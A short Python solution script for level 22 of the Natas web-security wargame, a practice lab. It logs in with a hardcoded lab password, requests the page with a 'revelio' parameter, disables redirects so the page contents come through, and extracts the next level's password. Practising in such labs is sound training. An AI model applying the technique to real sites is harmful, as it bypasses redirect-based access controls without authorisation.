import requests
import re

username = 'natas22'
password = '91awVM9oDiUGm33JdzM7RVLBS8bz9n0s'

url = 'http://%s.natas.labs.overthewire.org' % username

with open('natas22.html', 'w+') as out:
    session = requests.Session()
    # add option allow_redirect false to get password
    res = session.get(url+'/?revelio=admin%201',
                      auth=(username, password), allow_redirects=False)
    content = res.text
    out.write(content)
    flag = re.findall('Password: (.+?)</pre>',content)[0]
    print(flag)
